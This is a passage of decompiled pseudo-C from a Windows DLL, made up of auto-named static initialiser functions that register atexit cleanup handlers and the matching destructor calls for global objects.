//----- (1006CA93) --------------------------------------------------------
int sub_1006CA93()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E610);
  sub_10009D2C(dword_10095600, v0);
  return atexit(sub_1006CF44);
}
// 10095600: using guessed type _DWORD dword_10095600[2];

//----- (1006CAB5) --------------------------------------------------------
int sub_1006CAB5()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E668);
  sub_10009D2C(dword_100955F0, v0);
  return atexit(sub_1006CF4E);
}
// 100955F0: using guessed type _DWORD dword_100955F0[2];

//----- (1006CAD7) --------------------------------------------------------
int sub_1006CAD7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E6B0);
  sub_10009D2C(dword_100955F8, v0);
  return atexit(sub_1006CF58);
}
// 100955F8: using guessed type _DWORD dword_100955F8[2];

//----- (1006CAF9) --------------------------------------------------------
int sub_1006CAF9()
{
  sub_10025707(&dword_10095610);
  return atexit(sub_1006CF62);
}
// 10095610: using guessed type _DWORD dword_10095610;

//----- (1006CB11) --------------------------------------------------------
int sub_1006CB11()
{
  sub_10012CF1((int)dword_1009582C);
  return atexit(sub_1006CF76);
}
// 1009582C: using guessed type int dword_1009582C[9];

//----- (1006CB27) --------------------------------------------------------
int sub_1006CB27()
{
  return atexit(sub_1006CF6C);
}

//----- (1006CB33) --------------------------------------------------------
int sub_1006CB33()
{
  sub_1000B9A0(dword_10095618, aLnk);
  return atexit(sub_1006CF80);
}
// 10095618: using guessed type _DWORD dword_10095618[2];

//----- (1006CB4E) --------------------------------------------------------
int sub_1006CB4E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E1D4);
  sub_10009D2C(dword_10095620, v0);
  return atexit(sub_1006CF8A);
}
// 10095620: using guessed type _DWORD dword_10095620[2];

//----- (1006CB70) --------------------------------------------------------
int sub_1006CB70()
{
  sub_10009D2C(dword_10095630, aNtdllDll_5);
  return atexit(sub_1006CF94);
}
// 10095630: using guessed type _DWORD dword_10095630[2];

//----- (1006CB8B) --------------------------------------------------------
int sub_1006CB8B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E258);
  sub_10009D2C(dword_10095638, v0);
  return atexit(sub_1006CF9E);
}
// 10095638: using guessed type _DWORD dword_10095638[2];

//----- (1006CBAD) --------------------------------------------------------
int sub_1006CBAD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E224);
  sub_10009D2C(dword_10095628, v0);
  return atexit(sub_1006CFA8);
}
// 10095628: using guessed type _DWORD dword_10095628[2];

//----- (1006CBD9) --------------------------------------------------------
int sub_1006CBD9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E0E0);
  sub_10009D2C(dword_10095774, v0);
  return atexit(sub_1006CFB2);
}
// 10095774: using guessed type _DWORD dword_10095774[2];

//----- (1006CBFB) --------------------------------------------------------
int sub_1006CBFB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E120);
  sub_10009D2C(dword_10095784, v0);
  return atexit(sub_1006CFBC);
}
// 10095784: using guessed type _DWORD dword_10095784[2];

//----- (1006CC1D) --------------------------------------------------------
int sub_1006CC1D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008E178);
  sub_10009D2C(dword_1009577C, v0);
  return atexit(sub_1006CFC6);
}
// 1009577C: using guessed type _DWORD dword_1009577C[2];

//----- (1006CC3F) --------------------------------------------------------
void __cdecl sub_1006CC3F()
{
  sub_10009F65((int *)&unk_100950F0);
}

//----- (1006CC49) --------------------------------------------------------
void __cdecl sub_1006CC49()
{
  sub_100010A5(dword_10095050);
}
// 10095050: using guessed type _DWORD dword_10095050[2];

//----- (1006CC54) --------------------------------------------------------
void __cdecl sub_1006CC54()
{
  sub_10009F65((int *)&unk_100950F8);
}

//----- (1006CC5E) --------------------------------------------------------
void __cdecl sub_1006CC5E()
{
  sub_10009F65((int *)&unk_10095100);
}

//----- (1006CC68) --------------------------------------------------------
void __cdecl sub_1006CC68()
{
  sub_10009F65((int *)&unk_10095034);
}

//----- (1006CC72) --------------------------------------------------------
void __cdecl sub_1006CC72()
{
  sub_10009F65((int *)&unk_100950E0);
}

//----- (1006CC7C) --------------------------------------------------------
void __cdecl sub_1006CC7C()
{
  sub_10009F65((int *)&unk_100950E8);
}

//----- (1006CC86) --------------------------------------------------------
void __cdecl sub_1006CC86()
{
  sub_10009F65((int *)&unk_10095108);
}

//----- (1006CC90) --------------------------------------------------------
void __cdecl sub_1006CC90()
{
  sub_10009F65((int *)&unk_100950D8);
}

//----- (1006CC9A) --------------------------------------------------------
void __cdecl sub_1006CC9A()
{
  sub_10009F65((int *)&unk_1009503C);
}

//----- (1006CCA4) --------------------------------------------------------
void __cdecl sub_1006CCA4()
{
  sub_10009F65((int *)&unk_1009502C);
}

//----- (1006CCAE) --------------------------------------------------------
void __cdecl sub_1006CCAE()
{
  sub_10009F65(dword_10095044);
}
// 10095044: using guessed type int dword_10095044[3];

//----- (1006CCB8) --------------------------------------------------------
void __cdecl sub_1006CCB8()
{
  sub_10009F65((int *)&unk_10095024);
}

//----- (1006CCC2) --------------------------------------------------------
void __cdecl sub_1006CCC2()
{
  sub_10009F65((int *)&unk_1009501C);
}

//----- (1006CCCC) --------------------------------------------------------
void __cdecl sub_1006CCCC()
{
  sub_100027E6(dword_100957AC);
}
// 100957AC: using guessed type _DWORD dword_100957AC[2];

//----- (1006CCD6) --------------------------------------------------------
void __cdecl sub_1006CCD6()
{
  sub_10009F65(&dword_100957A4);
}
// 100957A4: using guessed type int dword_100957A4;

//----- (1006CCE0) --------------------------------------------------------
void __cdecl sub_1006CCE0()
{
  sub_10009F65((int *)&unk_10095408);
}

//----- (1006CCEA) --------------------------------------------------------
void __cdecl sub_1006CCEA()
{
  `eh vector destructor iterator'(&unk_10095110, 8u, 95, (void (__thiscall *)(void *))sub_10009F65);
}

//----- (1006CCFE) --------------------------------------------------------
void __cdecl sub_1006CCFE()
{
  sub_1000F027(dword_10095420);
}
// 10095420: using guessed type int dword_10095420[3];

//----- (1006CD08) --------------------------------------------------------
void __cdecl sub_1006CD08()
{
  sub_10009F65((int *)&unk_1009542C);
}

//----- (1006CD12) --------------------------------------------------------
void __cdecl sub_1006CD12()
{
  sub_10009F65((int *)&unk_10095418);
}

//----- (1006CD1C) --------------------------------------------------------
void __cdecl sub_1006CD1C()
{
  sub_10009F65((int *)&unk_10095434);
}

//----- (1006CD26) --------------------------------------------------------
void __cdecl sub_1006CD26()
{
  sub_10009F65((int *)&unk_10095410);
}

//----- (1006CD30) --------------------------------------------------------
void __cdecl sub_1006CD30()
{
  sub_1000F027(dword_1009544C);
}
// 1009544C: using guessed type int dword_1009544C[3];

//----- (1006CD3A) --------------------------------------------------------
void __cdecl sub_1006CD3A()
{
  sub_10009F65((int *)&unk_10095458);
}

//----- (1006CD44) --------------------------------------------------------
void __cdecl sub_1006CD44()
{
  sub_10009F65(dword_10095444);
}
// 10095444: using guessed type _DWORD dword_10095444[2];

//----- (1006CD4E) --------------------------------------------------------
void __cdecl sub_1006CD4E()
{
  sub_10009F65(dword_10095460);
}
// 10095460: using guessed type _DWORD dword_10095460[2];

//----- (1006CD58) --------------------------------------------------------
void __cdecl sub_1006CD58()
{
  sub_10009F65((int *)&unk_1009543C);
}

//----- (1006CD62) --------------------------------------------------------
void __cdecl sub_1006CD62()
{
  sub_100034EF(&off_10092418);
}
// 10092418: using guessed type int (__thiscall **off_10092418)(void *Block, char);

//----- (1006CD6C) --------------------------------------------------------
void __cdecl sub_1006CD6C()
{
  sub_10012D7D(dword_100957B4);
}
// 100957B4: using guessed type int dword_100957B4[9];

//----- (1006CD76) --------------------------------------------------------
void __cdecl sub_1006CD76()
{
  sub_1000C45D(dword_1009547C);
}
// 1009547C: using guessed type int dword_1009547C[5];

//----- (1006CD80) --------------------------------------------------------
void __cdecl sub_1006CD80()
{
  sub_1000C45D(dword_10095468);
}
// 10095468: using guessed type int dword_10095468[3];

//----- (1006CD8A) --------------------------------------------------------
void __cdecl sub_1006CD8A()
{
  sub_1000C45D(dword_100954A8);
}
// 100954A8: using guessed type int dword_100954A8[5];

//----- (1006CD94) --------------------------------------------------------
void __cdecl sub_1006CD94()
{
  sub_1000C45D(dword_10095494);
}
// 10095494: using guessed type int dword_10095494[3];

//----- (1006CD9E) --------------------------------------------------------
void __cdecl sub_1006CD9E()
{
  sub_100050FE(&dword_100954C0);
}
// 100954C0: using guessed type int dword_100954C0;

//----- (1006CDA8) --------------------------------------------------------
void __cdecl sub_1006CDA8()
{
  sub_10009F65(&dword_100954D0);
}
// 100954D0: using guessed type int dword_100954D0;

//----- (1006CDB2) --------------------------------------------------------
void __cdecl sub_1006CDB2()
{
  sub_10004ECE(dword_100954D8);
}
// 100954D8: using guessed type int dword_100954D8[4];

//----- (1006CDBD) --------------------------------------------------------
void __cdecl sub_1006CDBD()
{
  sub_10009105(&off_10092420);
}
// 10092420: using guessed type int (__thiscall **off_10092420)(void *Block, char);

//----- (1006CDC7) --------------------------------------------------------
void __cdecl sub_1006CDC7()
{
  sub_10012D7D(dword_100957D8);
}
// 100957D8: using guessed type int dword_100957D8[9];

//----- (1006CDD1) --------------------------------------------------------
void __cdecl sub_1006CDD1()
{
  sub_1000F027(dword_100954F8);
}
// 100954F8: using guessed type int dword_100954F8[3];

//----- (1006CDDB) --------------------------------------------------------
void __cdecl sub_1006CDDB()
{
  sub_10009F65((int *)&unk_10095504);
}

//----- (1006CDE5) --------------------------------------------------------
void __cdecl sub_1006CDE5()
{
  sub_10009F65((int *)&unk_100954F0);
}

//----- (1006CDEF) --------------------------------------------------------
void __cdecl sub_1006CDEF()
{
  sub_10009F65((int *)&unk_1009550C);
}

//----- (1006CDF9) --------------------------------------------------------
void __cdecl sub_1006CDF9()
{
  sub_10009F65((int *)&unk_100954E8);
}

//----- (1006CE03) --------------------------------------------------------
void __cdecl sub_1006CE03()
{
  sub_10009F65((int *)&unk_10095514);
}

//----- (1006CE0D) --------------------------------------------------------
void __cdecl sub_1006CE0D()
{
  sub_10009F65((int *)&unk_1009551C);
}

//----- (1006CE17) --------------------------------------------------------
void __cdecl sub_1006CE17()
{
  sub_10025779(&dword_10095524);
}
// 10095524: using guessed type _DWORD dword_10095524;

//----- (1006CE21) --------------------------------------------------------
void __cdecl sub_1006CE21()
{
  sub_10009F65((int *)&unk_1009553C);
}

//----- (1006CE2B) --------------------------------------------------------
void __cdecl sub_1006CE2B()
{
  sub_10009F65((int *)&unk_10095534);
}

//----- (1006CE35) --------------------------------------------------------
void __cdecl sub_1006CE35()
{
  sub_10009F65((int *)&unk_1009552C);
}

//----- (1006CE3F) --------------------------------------------------------
void __cdecl sub_1006CE3F()
{
  sub_10010A51(&off_10092428);
}
// 10092428: using guessed type int (__thiscall **off_10092428)(void *Block, char);

//----- (1006CE49) --------------------------------------------------------
void __cdecl sub_1006CE49()
{
  sub_10012D7D(dword_100957FC);
}
// 100957FC: using guessed type int dword_100957FC[9];

//----- (1006CE53) --------------------------------------------------------
void __cdecl sub_1006CE53()
{
  sub_10009F65((int *)&unk_1009556C);
}

//----- (1006CE5D) --------------------------------------------------------
void __cdecl sub_1006CE5D()
{
  sub_10009F65((int *)&unk_10095574);
}

//----- (1006CE67) --------------------------------------------------------
void __cdecl sub_1006CE67()
{
  sub_10009F65(&dword_10095554);
}
// 10095554: using guessed type int dword_10095554;

//----- (1006CE71) --------------------------------------------------------
void __cdecl sub_1006CE71()
{
  sub_10009F65(&dword_1009554C);
}
// 1009554C: using guessed type int dword_1009554C;

//----- (1006CE7B) --------------------------------------------------------
void __cdecl sub_1006CE7B()
{
  sub_10009F65((int *)&unk_10095544);
}

//----- (1006CE85) --------------------------------------------------------
void __cdecl sub_1006CE85()
{
  sub_10009F65(&dword_10095564);
}
// 10095564: using guessed type int dword_10095564;

//----- (1006CE8F) --------------------------------------------------------
void __cdecl sub_1006CE8F()
{
  sub_10009F65(&dword_1009555C);
}
// 1009555C: using guessed type int dword_1009555C;

//----- (1006CE9A) --------------------------------------------------------
void __cdecl sub_1006CE9A()
{
  sub_10009F65((int *)&unk_100955A8);
}

//----- (1006CEA4) --------------------------------------------------------
void __cdecl sub_1006CEA4()
{
  sub_10009F65((int *)&unk_10095598);
}

//----- (1006CEAE) --------------------------------------------------------
void __cdecl sub_1006CEAE()
{
  sub_10009F65((int *)&unk_100955A0);
}

//----- (1006CEB8) --------------------------------------------------------
void __cdecl sub_1006CEB8()
{
  sub_10009F65((int *)&unk_10095580);
}

//----- (1006CEC2) --------------------------------------------------------
void __cdecl sub_1006CEC2()
{
  sub_10009F65((int *)&unk_10095590);
}

//----- (1006CECC) --------------------------------------------------------
void __cdecl sub_1006CECC()
{
  sub_10009F65((int *)&unk_10095588);
}

//----- (1006CED6) --------------------------------------------------------
void __cdecl sub_1006CED6()
{
  sub_10009F65(&dword_100955B0);
}
// 100955B0: using guessed type int dword_100955B0;

//----- (1006CEE0) --------------------------------------------------------
void __cdecl sub_1006CEE0()
{
  sub_10009F65((int *)&unk_100955B8);
}

//----- (1006CEEA) --------------------------------------------------------
void __cdecl sub_1006CEEA()
{
  sub_10020BD2((LPVOID *)&dword_10091B04);
}
// 10091B04: using guessed type int dword_10091B04;

//----- (1006CEF4) --------------------------------------------------------
void __cdecl sub_1006CEF4()
{
  sub_10009F65((int *)&unk_100955C0);
}

//----- (1006CEFE) --------------------------------------------------------
void __cdecl sub_1006CEFE()
{
  sub_10009F65((int *)&unk_100955C8);
}

//----- (1006CF08) --------------------------------------------------------
void __cdecl sub_1006CF08()
{
  sub_10009F65((int *)&unk_100955D0);
}

//----- (1006CF12) --------------------------------------------------------
void __cdecl sub_1006CF12()
{
  sub_10009F65((int *)&unk_100955E8);
}

//----- (1006CF1C) --------------------------------------------------------
void __cdecl sub_1006CF1C()
{
  sub_10009F65((int *)&unk_100955D8);
}

//----- (1006CF26) --------------------------------------------------------
void __cdecl sub_1006CF26()
{
  sub_10009F65((int *)&unk_100955E0);
}

//----- (1006CF30) --------------------------------------------------------
void __cdecl sub_1006CF30()
{
  sub_10026929(dword_10095820);
}
// 10095820: using guessed type _DWORD dword_10095820[3];

//----- (1006CF3A) --------------------------------------------------------
void __cdecl sub_1006CF3A()
{
  sub_10009F65((int *)&unk_10095608);
}

//----- (1006CF44) --------------------------------------------------------
void __cdecl sub_1006CF44()
{
  sub_10009F65((int *)&unk_10095600);
}

//----- (1006CF4E) --------------------------------------------------------
void __cdecl sub_1006CF4E()
{
  sub_10009F65((int *)&unk_100955F0);
}

//----- (1006CF58) --------------------------------------------------------
void __cdecl sub_1006CF58()
{
  sub_10009F65((int *)&unk_100955F8);
}

//----- (1006CF62) --------------------------------------------------------
void __cdecl sub_1006CF62()
{
  sub_10025779(&dword_10095610);
}
// 10095610: using guessed type _DWORD dword_10095610;

//----- (1006CF6C) --------------------------------------------------------
void __cdecl sub_1006CF6C()
{
  sub_1002CF3A((void **)&off_10092434);
}
// 10092434: using guessed type int (__thiscall **off_10092434)(void *Block, char);

//----- (1006CF76) --------------------------------------------------------
void __cdecl sub_1006CF76()
{
  sub_10012D7D(dword_1009582C);
}
// 1009582C: using guessed type int dword_1009582C[9];

//----- (1006CF80) --------------------------------------------------------
void __cdecl sub_1006CF80()
{
  sub_1000BA51((int *)&unk_10095618);
}

//----- (1006CF8A) --------------------------------------------------------
void __cdecl sub_1006CF8A()
{
  sub_10009F65((int *)&unk_10095620);
}

//----- (1006CF94) --------------------------------------------------------
void __cdecl sub_1006CF94()
{
  sub_10009F65((int *)&unk_10095630);
}

//----- (1006CF9E) --------------------------------------------------------
void __cdecl sub_1006CF9E()
{
  sub_10009F65((int *)&unk_10095638);
}

//----- (1006CFA8) --------------------------------------------------------
void __cdecl sub_1006CFA8()
{
  sub_10009F65((int *)&unk_10095628);
}

//----- (1006CFB2) --------------------------------------------------------
void __cdecl sub_1006CFB2()
{
  sub_10009F65((int *)&unk_10095774);
}

//----- (1006CFBC) --------------------------------------------------------
void __cdecl sub_1006CFBC()
{
  sub_10009F65((int *)&unk_10095784);
}

//----- (1006CFC6) --------------------------------------------------------
void __cdecl sub_1006CFC6()
{
  sub_10009F65((int *)&unk_1009577C);
}

//----- (1006CFD0) --------------------------------------------------------
void __cdecl sub_1006CFD0()
{
  dword_100928A4 = &ikc::izq_ezibc::`vftable';
  sub_1003A301(&dword_100928A4);
}
